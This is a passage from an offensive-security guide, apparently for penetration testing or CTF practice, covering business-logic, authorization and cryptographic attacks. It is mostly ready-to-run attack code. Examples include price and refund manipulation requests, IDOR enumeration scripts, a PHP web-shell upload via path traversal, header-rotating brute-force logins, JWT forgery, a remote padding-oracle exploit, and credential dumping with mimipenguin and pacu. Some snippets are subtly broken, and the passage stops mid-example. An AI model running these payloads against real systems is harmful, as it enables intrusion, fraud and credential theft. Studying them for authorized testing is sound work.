def timing_attack_rsa():
    # Measure timing for various ciphertexts
    # Longer times may indicate specific modular operations
    # allowing private key recovery
    pass
```

**Network Timing Analysis**

```bash
# Using hping3 to measure response times
hping3 -S -p 80 target.com --count 100 --interval u1000

# Measuring TCP handshake timing
for i in {1..100}; do
    (time echo "GET / HTTP/1.0\r\n\r\n" | nc -w 1 target.com 80) 2>&1 | grep real
done
```

**Timing Attack Mitigation Detection**

```bash
# Check if constant-time comparison is used
# In source code review, look for:
# - crypto.timingSafeEqual() (Node.js)
# - hmac.compare_digest() (Python)
# - ConstantTimeCompare() (Go)
# - Avoid: ==, strcmp(), memcmp() for secrets
```

### Business Logic Bypass

Business logic vulnerabilities occur when application workflows can be manipulated to violate intended business rules.

**Price Manipulation**

```http
POST /checkout HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "item_id": 123,
  "price": 0.01,        # Modified price parameter
  "quantity": 1
}
```

**Negative Quantity Exploit**

```http
POST /cart/add HTTP/1.1
Host: target.com

item=premium_item&quantity=-5

# Then add positive quantity of cheaper item
# May result in negative total price
```

**Coupon/Discount Stacking**

```python
import requests

# Apply same coupon multiple times
session = requests.Session()
session.post("http://target.com/login", data={"user": "victim", "pass": "pass"})

# Add expensive item
session.post("http://target.com/cart/add", data={"item_id": 999})

# Apply coupon multiple times if not properly validated
for i in range(10):
    response = session.post("http://target.com/cart/coupon", 
                           data={"code": "DISCOUNT50"})
    print(f"Attempt {i}: {response.text}")
```

**Workflow Step Bypass**

```http
# Normal workflow: Step1 -> Step2 -> Step3 -> Payment
# Attempt to skip verification steps

# Skip directly to final step
POST /checkout/complete HTTP/1.1
Host: target.com

order_id=12345&payment_verified=true
```

**Parameter Pollution for Logic Bypass**

```http
# Submit multiple values for same parameter
GET /transfer?from=victim&to=attacker&to=legitimate&amount=1000 HTTP/1.1
Host: bank.com

# Application might use first 'to' for logging but second for actual transfer
```

**Integer Overflow in Business Logic**

```python
# Exploit integer overflow in credit system
import requests

# If credits stored as signed 32-bit integer
MAX_INT32 = 2147483647

# Purchase something that costs more than you have
# Wrap around to negative, then becomes large positive
data = {
    "item": "expensive_item",
    "quantity": MAX_INT32
}
requests.post("http://target.com/purchase", data=data)
```

**Refund/Return Logic Abuse**

```http
POST /refund HTTP/1.1
Host: ecommerce.com

order_id=123&amount=999999

# Check if refund amount is validated against original purchase
# Or if you can request refund multiple times
```

**Insufficient Verification Example**

```bash
# Application checks if user owns resource but not quantity
# Request 1: Transfer 100 coins (have 100)
curl -X POST http://target.com/transfer -d "amount=100&to=attacker"

# Request 2: Transfer 100 more coins (now have 0)
# If balance check happens at different time than deduction
curl -X POST http://target.com/transfer -d "amount=100&to=attacker"
```

### State Machine Errors

State machines enforce valid state transitions. Errors occur when invalid transitions are possible.

**Authentication State Bypass**

```python
import requests

session = requests.Session()

# Skip login and directly access authenticated state
# by setting session/state tokens manually
session.cookies.set("authenticated", "true")
session.cookies.set("user_id", "1")

# Access admin panel without proper authentication
response = session.get("http://target.com/admin")
```

**Shopping Cart State Manipulation**

```http
# State machine: Browse -> Add to Cart -> Checkout -> Payment -> Confirm
# Attempt invalid transition

# Add items to cart
POST /cart/add
item_id=123&price=100

# Skip payment, go directly to confirm
POST /order/confirm
order_id=456
```

**Multi-Step Process Violation**

```python
# Exploit insufficient state tracking
import requests

# Normal flow: register -> verify_email -> activate
# Try: register -> activate (skip verification)

s = requests.Session()
s.post("http://target.com/register", data={
    "username": "attacker",
    "email": "attacker@evil.com"
})

# Don't verify email, directly activate
# Application might not check verification state
s.post("http://target.com/activate", data={
    "username": "attacker"
})
```

**OAuth/OIDC State Confusion**

```http
# OAuth flow state parameter manipulation
# Normal: /auth -> /callback?code=X&state=Y
# Attacker: Use state from different session

GET /callback?code=ATTACKER_CODE&state=VICTIM_STATE HTTP/1.1
Host: target.com

# If state validation is weak, might link attacker's 
# OAuth account to victim's session
```

**Stateless Token Manipulation**

```python
import jwt
import json

# Decode JWT without verification
token = "eyJhbGc..."
decoded = jwt.decode(token, options={"verify_signature": False})

print(json.dumps(decoded, indent=2))
# Modify state-related claims
decoded['role'] = 'admin'
decoded['verified'] = True

# Re-encode (if weak/no signature)
new_token = jwt.encode(decoded, None, algorithm='none')
```

**Session Fixation**

```http
# Attacker sets session ID before victim authenticates
# Then victim's authentication associates with attacker's session

# Step 1: Attacker obtains session ID
GET / HTTP/1.1
Host: target.com
# Response: Set-Cookie: SESSIONID=attacker_controlled

# Step 2: Attacker sends victim link with fixed session
http://target.com/?SESSIONID=attacker_controlled

# Step 3: Victim logs in using that session
# Step 4: Attacker uses same session ID to access victim's account
```

**Detecting State Machine Errors**

```bash
# Burp Suite: Spider + Analyze workflows
# Look for state parameter in requests/responses
grep -r "state\|step\|stage\|phase" burp_logs.xml

# Manual testing checklist:
# - Access later steps without completing earlier ones
# - Repeat steps in wrong order
# - Skip optional steps that should be mandatory
# - Reuse old state tokens
# - Manipulate state parameters
```

### Authorization Bypass

Authorization bypass occurs when users can access resources or perform actions they shouldn't be permitted to.

**Insecure Direct Object References (IDOR)**

```http
# Access other users' data by changing ID parameter
GET /api/user/123/profile HTTP/1.1
Host: target.com
Cookie: session=your_session

# Try sequential IDs
GET /api/user/124/profile HTTP/1.1
GET /api/user/125/profile HTTP/1.1

# Or predictable patterns
GET /api/document/DOC-001 HTTP/1.1
GET /api/document/DOC-002 HTTP/1.1
```

**IDOR Fuzzing Script**

```python
import requests

base_url = "http://target.com/api/document/"
headers = {"Cookie": "session=your_session"}

# Test sequential IDs
for doc_id in range(1, 1000):
    url = f"{base_url}{doc_id}"
    response = requests.get(url, headers=headers)
    
    if response.status_code == 200:
        print(f"[+] Accessible: {url}")
        print(f"    Content preview: {response.text[:100]}")
    elif response.status_code == 403:
        print(f"[-] Forbidden: {url}")
    elif response.status_code == 404:
        continue  # Not found
```

**UUID/GUID Enumeration**

[Inference] Even with UUIDs, authorization checks might be missing:

```python
import requests
import uuid

# If UUIDs are sequential or predictable
base_uuid = uuid.UUID("550e8400-e29b-41d4-a716-446655440000")

for i in range(100):
    test_uuid = uuid.UUID(int=base_uuid.int + i)
    url = f"http://target.com/api/resource/{test_uuid}"
    response = requests.get(url, headers=headers)
    
    if response.status_code == 200:
        print(f"[+] Found: {test_uuid}")
```

**HTTP Method Override**

```http
# Application blocks POST but not PUT/DELETE
POST /api/user/123 HTTP/1.1
Host: target.com
# 403 Forbidden

# Try method override
POST /api/user/123 HTTP/1.1
X-HTTP-Method-Override: PUT
# May succeed if not properly validated

# Or use actual different methods
PUT /api/user/123 HTTP/1.1
DELETE /api/user/123 HTTP/1.1
```

**Function-Level Authorization Bypass**

```http
# Admin function exposed without proper authorization
POST /admin/delete_user HTTP/1.1
Host: target.com
Cookie: regular_user_session

user_id=victim

# Check if authorization is only UI-based
# Backend may not verify user role
```

**GraphQL Authorization Bypass**

```graphql
# Query data that should be restricted
query {
  users {
    id
    email
    password_hash
    ssn
  }
}

# Or use introspection to discover hidden fields
query {
  __schema {
    types {
      name
      fields {
        name
      }
    }
  }
}
```

**Mass Assignment Vulnerability**

```http
# Application doesn't filter which fields can be updated
PUT /api/user/profile HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "email": "new@email.com",
  "role": "admin",              # Attempt to escalate privileges
  "is_verified": true,
  "credits": 999999
}
```

**Path Traversal for Authorization Bypass**

```http
# Access restricted files using path traversal
GET /api/files/../../../../etc/passwd HTTP/1.1

# Or with URL encoding
GET /api/files/..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1

# Double encoding
GET /api/files/..%252F..%252Fetc%252Fpasswd HTTP/1.1
```

### Access Control Circumvention

**Horizontal Privilege Escalation**

```python
# Access resources belonging to other users at same privilege level
import requests

your_session = "abc123"
headers = {"Cookie": f"session={your_session}"}

# Enumerate user IDs or usernames
for user_id in range(1, 1000):
    response = requests.get(
        f"http://target.com/api/messages?user_id={user_id}",
        headers=headers
    )
    if response.status_code == 200:
        print(f"[+] Can access user {user_id}'s messages")
```

**Vertical Privilege Escalation**

```http
# Regular user accessing admin functions
POST /admin/create_user HTTP/1.1
Host: target.com
Cookie: regular_user_session
Content-Type: application/json

{
  "username": "backdoor",
  "password": "password",
  "role": "admin"
}
```

**Cookie/Token Manipulation for Privilege Escalation**

```python
import base64
import json

# Decode cookie
cookie = "eyJ1c2VyIjoidXNlciIsInJvbGUiOiJ1c2VyIn0="
decoded = base64.b64decode(cookie)
print(decoded)  # {"user":"user","role":"user"}

# Modify role
modified = {"user": "user", "role": "admin"}
new_cookie = base64.b64encode(json.dumps(modified).encode())
print(new_cookie)

# Use modified cookie
# If no signature verification, might work
```

**JWT Privilege Escalation**

```python
import jwt

token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

# Decode without verification
decoded = jwt.decode(token, options={"verify_signature": False})
print(decoded)

# Modify claims
decoded['role'] = 'admin'
decoded['is_admin'] = True

# Algorithm confusion attack (change RS256 to HS256)
# [Unverified] May work if server has public key accessible
new_token = jwt.encode(decoded, public_key, algorithm='HS256')
```

**IP-Based Access Control Bypass**

```http
# Spoof internal IP using headers
GET /admin HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
```

**Referer-Based Access Control Bypass**

```http
# If access control checks Referer header
GET /admin/sensitive_action HTTP/1.1
Host: target.com
Referer: http://target.com/admin/dashboard
Cookie: regular_user_session
```

**User-Agent Based Restrictions**

```bash
# Bypass mobile/desktop restrictions
curl -A "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0)" http://target.com/mobile_only

# Bypass bot detection
curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" http://target.com/
```

**Parameter Pollution for Access Control**

```http
# Application might use first parameter for logging, second for authorization
GET /delete?user_id=123&user_id=456 HTTP/1.1
Host: target.com

# Or in POST body
user_id=victim&user_id=attacker
```

**Bypassing Rate Limiting (Related to Access Control)**

```python
# Rotate headers to bypass IP-based rate limiting
import requests
import random

headers_list = [
    {"X-Forwarded-For": f"192.168.1.{random.randint(1, 254)}"},
    {"X-Real-IP": f"10.0.0.{random.randint(1, 254)}"},
    {"X-Originating-IP": f"172.16.0.{random.randint(1, 254)}"}
]

for i in range(1000):
    headers = random.choice(headers_list)
    response = requests.post(
        "http://target.com/login",
        data={"user": "admin", "pass": f"pass{i}"},
        headers=headers
    )
```

**File Upload Access Control Bypass**

```http
# Upload file to restricted location
POST /upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="../../var/www/html/shell.php"
Content-Type: application/x-php

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--
```

**Testing Checklist for Access Control**

```bash
# Systematic access control testing:

# 1. Test with no authentication
# 2. Test with different user roles
# 3. Test horizontal access (same role, different user)
# 4. Test vertical access (lower role accessing higher functions)
# 5. Test direct URL access to restricted functions
# 6. Test HTTP methods (GET, POST, PUT, DELETE, PATCH)
# 7. Test parameter manipulation (IDs, roles, permissions)
# 8. Test token/session manipulation
# 9. Test with expired/invalid sessions
# 10. Test forced browsing to hidden endpoints
```

**Automated Access Control Testing**

```bash
# Using Burp Suite Autorize extension
# 1. Configure low-privilege user session
# 2. Browse as high-privilege user
# 3. Autorize replays requests with low-privilege session
# 4. Highlights authorization failures

# Using ffuf for forced browsing
ffuf -w wordlist.txt -u http://target.com/admin/FUZZ -H "Cookie: session=regular_user"

# Using custom Python script
python3 << 'EOF'
import requests

endpoints = ["/admin", "/api/users", "/dashboard", "/settings"]
sessions = {
    "admin": "admin_session_token",
    "user": "user_session_token",
    "none": ""
}

for endpoint in endpoints:
    print(f"\nTesting {endpoint}:")
    for role, session in sessions.items():
        headers = {"Cookie": f"session={session}"} if session else {}
        r = requests.get(f"http://target.com{endpoint}", headers=headers)
        print(f"  {role}: {r.status_code}")
EOF
```

### Related Topics for Further Study

- OAuth 2.0 and OIDC implementation vulnerabilities
- CSRF and SSRF in context of authorization bypass
- WebSocket authorization vulnerabilities
- API security and GraphQL authorization issues

---

## Cryptographic Weaknesses

### Weak Encryption Algorithms

Weak or obsolete cryptographic algorithms provide insufficient security against modern attacks.

**Identifying Weak Algorithms**

```bash
# Scan for weak SSL/TLS ciphers
nmap --script ssl-enum-ciphers -p 443 target.com

# Using testssl.sh (comprehensive)
testssl.sh https://target.com

# Using sslscan
sslscan target.com:443

# Check for specific weak protocols
openssl s_client -connect target.com:443 -ssl3
openssl s_client -connect target.com:443 -tls1
openssl s_client -connect target.com:443 -tls1_1
```

**Common Weak Algorithms**

Encryption algorithms considered weak:

- **DES** (Data Encryption Standard) - 56-bit key, brute-forceable
- **3DES** (Triple DES) - Deprecated, vulnerable to Sweet32
- **RC4** - Stream cipher with biases
- **Blowfish** - 64-bit block size, vulnerable to birthday attacks
- **MD5** - Collision attacks practical
- **SHA-1** - Collision attacks demonstrated (SHAttered)

**DES Cracking**

```bash
# Using hashcat for DES
hashcat -m 14000 -a 3 hash.txt ?a?a?a?a?a?a?a?a

# John the Ripper with DES
john --format=descrypt hash.txt

# Using known plaintext attack
# If you have plaintext-ciphertext pair
python3 des_attack.py --known-plaintext "known_text" --ciphertext "encrypted"
```

**RC4 Exploitation**

```python
#!/usr/bin/env python3
# RC4 bias exploitation (statistical attack)
from collections import Counter

def rc4_keystream_bias(ciphertexts):
    """
    Exploit RC4 keystream bias (first bytes have known biases)
    """
    # RC4 has bias in early keystream bytes
    # Byte 2 is biased toward 0
    # Position 256: biased toward 129
    
    positions = {}
    for ct in ciphertexts:
        for i, byte in enumerate(ct):
            if i not in positions:
                positions[i] = []
            positions[i].append(byte)
    
    # Recover plaintext using most common byte at each position
    recovered = []
    for pos in sorted(positions.keys()):
        counter = Counter(positions[pos])
        most_common = counter.most_common(1)[0][0]
        recovered.append(most_common)
    
    return bytes(recovered)

# Requires many ciphertexts encrypted with same key
ciphertexts = [...]  # Collect multiple RC4 ciphertexts
plaintext = rc4_keystream_bias(ciphertexts)
print(f"Recovered: {plaintext}")
```

**MD5 Collision Generation**

```bash
# Using HashClash for MD5 collisions
git clone https://github.com/cr-marcstevens/hashclash
cd hashclash
make

# Generate chosen-prefix collision
./scripts/cpc.sh prefix1.bin prefix2.bin

# Result: Two different files with same MD5 hash
md5sum collision1.bin collision2.bin
```

**Sweet32 Attack (3DES, Blowfish)**

[Inference] Sweet32 exploits 64-bit block ciphers after ~32GB of data encrypted with same key:

```python
#!/usr/bin/env python3
# Sweet32 birthday attack concept
import math

def collision_probability(block_size_bits, blocks_encrypted):
    """
    Calculate collision probability for birthday attack
    block_size_bits: 64 for 3DES/Blowfish
    """
    n = 2 ** block_size_bits
    probability = 1 - math.exp(-blocks_encrypted**2 / (2*n))
    return probability

# For 64-bit blocks (3DES)
blocks_32gb = (32 * 1024**3 * 8) / 64  # ~4 billion blocks
prob = collision_probability(64, blocks_32gb)
print(f"Collision probability after 32GB: {prob:.2%}")

# For 128-bit blocks (AES) - much safer
prob_aes = collision_probability(128, blocks_32gb)
print(f"AES collision probability: {prob_aes:.10f}%")
```

**Checking Application Crypto**

```bash
# Analyze binary for crypto functions
strings binary | grep -i "crypt\|md5\|sha1\|des\|rc4"

# Using radare2
r2 binary
aaa
afl | grep crypt

# Check imported crypto libraries
ldd binary | grep crypto
objdump -T binary | grep -i "crypt\|cipher"

# Analyze Python/Ruby applications
grep -r "Crypto\|hashlib\|openssl" .
grep -E "MODE_ECB|md5|sha1" *.py
```

### Poor Key Management

Improper key handling exposes cryptographic systems to compromise.

**Hardcoded Keys Detection**

```bash
# Search for common patterns in source code
grep -r "password\s*=\s*['\"]" .
grep -r "api[_-]?key\s*=\s*['\"]" .
grep -r "secret\s*=\s*['\"]" .
grep -r "BEGIN.*PRIVATE KEY" .

# Using truffleHog for secret detection
trufflehog git https://github.com/target/repo --regex --entropy=True

# Using gitleaks
gitleaks detect --source . --verbose

# Check compiled binaries
strings binary | grep -i "key\|password\|secret"
strings binary | grep "BEGIN.*PRIVATE KEY"
```

**Extracting Keys from Memory**

```bash
# Using volatility for memory dumps
volatility -f memory.dump --profile=Win10x64 filescan | grep -i "key\|password"

# Extract process memory
gcore -o dump PID
strings dump.PID | grep -E "BEGIN.*PRIVATE KEY|key.*="

# Using mimipenguin for Linux passwords
sudo python3 mimipenguin.py

# Search for common key patterns in memory
xxd memory.dump | grep "2d 2d 2d 2d 2d 42 45 47 49 4e"  # "-----BEGIN"
```

**Weak Key Generation**

```python
#!/usr/bin/env python3
# Example of WEAK key generation (DO NOT USE)

import random

# WEAK: Using predictable random
random.seed(12345)
weak_key = ''.join([chr(random.randint(0, 255)) for _ in range(16)])

# WEAK: Low entropy
weak_key2 = "password123"

# WEAK: Derived from predictable data
import time
weak_key3 = str(int(time.time()))  # timestamp as key

# CORRECT: Using cryptographically secure random
import secrets
strong_key = secrets.token_bytes(32)  # 256-bit key
```

**Key Reuse Detection**

```python
#!/usr/bin/env python3
from collections import defaultdict

def detect_key_reuse(ciphertexts, nonce_key_pairs):
    """
    Detect key/nonce reuse in stream ciphers or CTR mode
    """
    seen_nonces = defaultdict(list)
    
    for i, (nonce, ciphertext) in enumerate(nonce_key_pairs):
        if nonce in seen_nonces:
            print(f"[!] Nonce reuse detected!")
            print(f"    Message {i} reuses nonce from message(s): {seen_nonces[nonce]}")
            
            # XOR ciphertexts to recover plaintext XOR
            for j in seen_nonces[nonce]:
                xor_result = bytes([a ^ b for a, b in zip(
                    ciphertext, 
                    nonce_key_pairs[j][1]
                )])
                print(f"    CT[{i}] ⊕ CT[{j}] = {xor_result.hex()}")
        
        seen_nonces[nonce].append(i)

# Example usage
pairs = [
    (b"nonce1", b"\x41\x42\x43"),
    (b"nonce2", b"\x44\x45\x46"),
    (b"nonce1", b"\x47\x48\x49"),  # Reuse!
]
detect_key_reuse(None, pairs)
```

**RSA Private Key Extraction**

```bash
# Extract from PKCS#12 (.p12, .pfx)
openssl pkcs12 -in certificate.p12 -nocerts -out private_key.pem

# Extract from PEM
openssl rsa -in certificate.pem -out private_key.pem

# Check if private key is encrypted
openssl rsa -text -in private_key.pem -noout

# Crack weak RSA key passphrase
john --wordlist=rockyou.txt private_key_hash

# Convert key formats
ssh-keygen -p -f id_rsa -m pem -P "" -N ""
```

**AWS Key Exploitation**

```bash
# If AWS access keys found
export AWS_ACCESS_KEY_ID="AKIAIOSFODNN7EXAMPLE"
export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"

# Enumerate permissions
aws sts get-caller-identity
aws iam list-users
aws iam list-roles
aws s3 ls

# Using pacu for AWS exploitation
python3 pacu.py
run iam__enum_permissions
run s3__download_bucket --bucket-name target-bucket
```

### Insufficient Randomness

Weak random number generation enables prediction of cryptographic values.

**Detecting Weak PRNGs**

```python
#!/usr/bin/env python3
import matplotlib.pyplot as plt
from collections import Counter

def analyze_randomness(samples):
    """
    Statistical tests for randomness
    """
    # Frequency test
    counter = Counter(samples)
    expected = len(samples) / 256
    chi_square = sum((count - expected)**2 / expected 
                     for count in counter.values())
    
    print(f"Chi-square statistic: {chi_square:.2f}")
    print(f"Expected (uniform): ~255")
    
    # Serial correlation test
    correlations = []
    for lag in range(1, min(100, len(samples)//2)):
        correlation = sum(
            samples[i] * samples[i+lag] 
            for i in range(len(samples)-lag)
        ) / (len(samples) - lag)
        correlations.append(correlation)
    
    # Runs test
    runs = 1
    for i in range(1, len(samples)):
        if (samples[i] > 127) != (samples[i-1] > 127):
            runs += 1
    expected_runs = len(samples) / 2
    
    print(f"Runs: {runs}, Expected: {expected_runs:.0f}")
    
    return chi_square, correlations

# Test samples
samples = [...]  # Collect random outputs
analyze_randomness(samples)
```

**Predictable Random Exploitation**

```python
#!/usr/bin/env python3
import random
import time

def exploit_seeded_random(observed_values):
    """
    Exploit time-based seed in random()
    """
    # Guess seed based on timestamp
    current_time = int(time.time())
    
    for seed_candidate in range(current_time - 3600, current_time + 1):
        random.seed(seed_candidate)
        
        # Generate values and compare with observed
        test_values = [random.randint(0, 100) for _ in range(len(observed_values))]
        
        if test_values == observed_values:
            print(f"[+] Found seed: {seed_candidate}")
            
            # Predict future values
            future = [random.randint(0, 100) for _ in range(10)]
            print(f"[+] Next 10 values: {future}")
            return seed_candidate
    
    return None

# Example: exploit web app generating session tokens
observed = [42, 17, 93, 28, 61]  # Observed random values
exploit_seeded_random(observed)
```

**Linear Congruential Generator (LCG) Cracking**

```python
#!/usr/bin/env python3

def crack_lcg(outputs):
    """
    Crack LCG parameters from outputs
    LCG: X_{n+1} = (a * X_n + c) mod m
    """
    if len(outputs) < 3:
        return None
    
    # For 32-bit LCG (common case)
    m = 2**32
    
    # Calculate differences
    t1 = (outputs[1] - outputs[0]) % m
    t2 = (outputs[2] - outputs[1]) % m
    
    # Calculate multiplier 'a'
    # a = (t2 * modinv(t1, m)) % m
    # Simplified approach for common LCGs
    
    # Try common LCG parameters
    common_lcgs = [
        (1103515245, 12345, 2**31),  # glibc
        (214013, 2531011, 2**31),     # MSVC
        (1664525, 1013904223, 2**32), # Numerical Recipes
    ]
    
    for a, c, mod in common_lcgs:
        # Test if parameters match
        test = [(a * outputs[i] + c) % mod for i in range(len(outputs)-1)]
        if test == outputs[1:]:
            print(f"[+] Found LCG parameters: a={a}, c={c}, m={mod}")
            
            # Predict next values
            next_val = (a * outputs[-1] + c) % mod
            print(f"[+] Next value: {next_val}")
            return (a, c, mod)
    
    return None

# Example usage
observed_randoms = [12345, 1406932606, 654583775, 1449466924]
crack_lcg(observed_randoms)
```

**Mersenne Twister State Recovery**

```python
#!/usr/bin/env python3

def untemper(y):
    """
    Reverse MT19937 tempering transformation
    """
    y ^= (y >> 18)
    y ^= (y << 15) & 0xefc60000
    
    # Reverse (y ^ (y << 7) & 0x9d2c5680)
    for i in range(4):
        y ^= (y << 7) & 0x9d2c5680
    
    # Reverse (y ^ (y >> 11))
    for i in range(3):
        y ^= (y >> 11)
    
    return y & 0xffffffff

def clone_mt19937(outputs):
    """
    Clone Mersenne Twister state from 624 consecutive outputs
    """
    if len(outputs) < 624:
        print("[-] Need at least 624 outputs to clone state")
        return None
    
    # Recover internal state
    state = [untemper(x) for x in outputs[:624]]
    
    print("[+] Mersenne Twister state recovered!")
    print("[+] Can now predict all future outputs")
    
    return state

# Exploit example
import random
random.seed(12345)
observed = [random.getrandbits(32) for _ in range(624)]

# Clone the RNG state
cloned_state = clone_mt19937(observed)

# Predict next values
next_value = random.getrandbits(32)
print(f"[+] Predicted next: {next_value}")
```

**Entropy Testing**

```bash
# Using ent tool
ent random_data.bin

# Using rngtest
cat /dev/urandom | rngtest -c 1000

# Custom entropy calculation
python3 << 'EOF'
import math
from collections import Counter

def calculate_entropy(data):
    counter = Counter(data)
    total = len(data)
    entropy = -sum(
        (count/total) * math.log2(count/total) 
        for count in counter.values()
    )
    return entropy

# Read data
with open('random_data.bin', 'rb') as f:
    data = f.read()

entropy = calculate_entropy(data)
max_entropy = 8.0  # bits per byte
print(f"Entropy: {entropy:.4f} bits/byte")
print(f"Quality: {(entropy/max_entropy)*100:.2f}%")
EOF
```

### Cryptographic Implementation Flaws

Improper implementation of cryptographic primitives introduces vulnerabilities.

**Padding Oracle Attack (CBC Mode)**

```python
#!/usr/bin/env python3
from Crypto.Cipher import AES
import requests

def padding_oracle(ciphertext, iv):
    """
    Exploit CBC padding oracle to decrypt ciphertext
    """
    block_size = 16
    plaintext = b''
    
    # Process each block
    blocks = [ciphertext[i:i+block_size] 
              for i in range(0, len(ciphertext), block_size)]
    
    for block_num, block in enumerate(blocks):
        if block_num == 0:
            prev_block = iv
        else:
            prev_block = blocks[block_num - 1]
        
        decrypted_block = b''
        
        # Decrypt each byte of the block
        for byte_pos in range(block_size - 1, -1, -1):
            padding_value = block_size - byte_pos
            
            # Try all possible byte values
            for guess in range(256):
                # Craft malicious IV/previous block
                crafted = bytearray(prev_block)
                crafted[byte_pos] = guess
                
                # Adjust already-known bytes
                for i in range(byte_pos + 1, block_size):
                    crafted[i] ^= decrypted_block[block_size - 1 - i] ^ padding_value
                
                # Query oracle
                if query_padding_oracle(bytes(crafted), block):
                    # Found valid padding
                    intermediate_byte = guess ^ padding_value
                    plaintext_byte = intermediate_byte ^ prev_block[byte_pos]
                    decrypted_block = bytes([plaintext_byte]) + decrypted_block
                    break
        
        plaintext += decrypted_block
    
    return plaintext

def query_padding_oracle(iv, ciphertext):
    """
    Query remote padding oracle
    Returns True if padding is valid
    """
    # Example: HTTP request to vulnerable endpoint
    response = requests.post(
        'http://target.com/decrypt',
        data={'iv': iv.hex(), 'ciphertext': ciphertext.hex()}
    )
    
    # Different responses for valid/invalid padding
    return b"Padding error" not in response.content

# Example usage
ct = bytes.fromhex("deadbeef...")
iv = bytes.fromhex("cafebabe...")
plaintext = padding_oracle(ct, iv)
print(f"Decrypted: {plaintext}")
```

**ECB Mode Detection and Exploitation**

```python
#!/usr/bin/env python3
from collections import Counter

def detect_ecb(ciphertext, block_size=16):
    """
    Detect ECB mode by finding repeated blocks
    """
    blocks = [ciphertext[i:i+block_size] 
              for i in range(0, len(ciphertext), block_size)]
    
    unique_blocks = len(set(blocks))
    total_blocks = len(blocks)
    
    if unique_blocks < total_blocks:
        print(f"[+] ECB mode detected!")
        print(f"    {total_blocks - unique_blocks} repeated blocks")
        return True
    
    return False

def ecb_byte_at_a_time(oracle_encrypt):
    """
    ECB byte-at-a-time attack
    Assumes: oracle_encrypt(our_input) = ECB(our_input || secret)
    """
    block_size = 16
    secret = b''
    
    # Determine secret length
    base_len = len(oracle_encrypt(b''))
    secret_len = base_len
    
    # Decrypt byte by byte
    for position in range(secret_len):
        # Craft input to align secret byte at block boundary
        prefix_len = (block_size - 1 - (position % block_size))
        prefix = b'A' * prefix_len
        
        # Get target block
        target_block_num = position // block_size
        target = oracle_encrypt(prefix)
        target_block = target[
            target_block_num * block_size:
            (target_block_num + 1) * block_size
        ]
        
        # Build dictionary
        for byte_guess in range(256):
            test_input = prefix + secret + bytes([byte_guess])
            test_output = oracle_encrypt(test_input)
            test_block = test_output[
                target_block_num * block_size:
                (target_block_num + 1) * block_size
            ]
            
            if test_block == target_block:
                secret += bytes([byte_guess])
                break
    
    return secret

# Example vulnerable oracle
from Crypto.Cipher import AES
key = b'YELLOW SUBMARINE'
secret_suffix = b'secret message!!'

def vulnerable_oracle(plaintext):
    cipher = AES.new(key, AES.MODE_ECB)
    padded = plaintext + secret_suffix
    # Add PKCS7 padding
    pad_len = 16 - (len(padded) % 16)
    padded += bytes([pad_len]) * pad_len
    return cipher.encrypt(padded)

# Exploit
recovered = ecb_byte_at_a_time(vulnerable_oracle)
print(f"Recovered secret: {recovered}")
```

**CBC Bit-Flipping Attack**

```python
#!/usr/bin/env python3

def cbc_bit_flip(ciphertext, iv, target_position, original_byte, desired_byte):
    """
    Flip bits in CBC mode to modify plaintext
    Modifying byte in block N affects plaintext in block N+1
    """
    block_size = 16
    
    # Calculate which block to modify
    block_to_modify = target_position // block_size - 1
    byte_in_block = target_position % block_size
    
    if block_to_modify < 0:
        # Modify IV for first block
        modified_iv = bytearray(iv)
        modified_iv[byte_in_block] ^= original_byte ^ desired_byte
        return bytes(modified_iv), ciphertext
    
    # Modify previous ciphertext block
    modified_ct = bytearray(ciphertext)
    position = block_to_modify * block_size + byte_in_block
    modified_ct[position] ^= original_byte ^ desired_byte
    
    return iv, bytes(modified_ct)

# Example: Change "user=regular" to "user=admin!!!"
# Assume we control first block of plaintext
original = b"user=regular&uid=1000"
ciphertext = b"..." # Encrypted original
iv = b"..." # IV used

# Flip bits to change "regular" to "admin!!!"
# Position 5-11 contains "regular"
new_iv, new_ct = cbc_bit_flip(ciphertext, iv, 5, ord('r'), ord('a'))
new_iv, new_ct = cbc_bit_flip(new_ct, new_iv, 6, ord('e'), ord('d'))
new_iv, new_ct = cbc_bit_flip(new_ct, new_iv, 7, ord('g'), ord('m'))
# ... continue for remaining bytes
```

**Hash Length Extension Attack**

```python
#!/usr/bin/env python3
import hashlib
import struct

def length_extension_attack(original_hash, original_length, append_data, hash_algo='md5'):
    """
    Exploit hash length extension vulnerability in MD5, SHA1, SHA256
    """
    # Calculate padding for original message
    original_padding = compute_padding(original_length, hash_algo)
    
    # Parse original hash as internal state
    if hash_algo == 'md5':
        state = struct.unpack('<4I', bytes.fromhex(original_hash))
        hash_func = hashlib.md5
    elif hash_algo == 'sha1':
        state = struct.unpack('>5I', bytes.fromhex(original_hash))
        hash_func = hashlib.sha1
    elif hash_algo == 'sha256':
        state = struct.unpack('>8I', bytes.fromhex(original_hash))
        hash_func = hashlib.sha256
    
    # Create hash object with forged state
    # Note: This requires low-level crypto library (e.g., hlextend)
    from hlextend import new as hlextend_new
    
    extended_hash = hlextend_new(
        hash_algo,
        original_hash,
        original_length
    ).extend(append_data)
    
    forged_data = original_padding + append_data
    
    return extended_hash, forged_data

def compute_padding(msg_len, algo):
    """
    Compute MD5/SHA padding
    """
    padding = b'\x80'
    
    # Calculate padding length
    if algo in ['md5', 'sha1', 'sha256']:
        pad_len = (55 - msg_len) % 64
    else:
        pad_len = (111 - msg_len) % 128
    
    padding += b'\x00' * pad_len
    
    # Append length
    bit_len = msg_len * 8
    if algo in ['md5']:
        padding += struct.pack('<Q', bit_len)
    else:
        padding += struct.pack('>Q', bit_len)
    
    return padding

# Example: Exploit vulnerable MAC
# MAC = H(secret || message)
original_msg = b"user=guest"
original_mac = "5d41402abc4b2a76b9719d911017c592"  # Known MAC
secret_length = 16  # Guessed/known secret length

append = b"&admin=true"
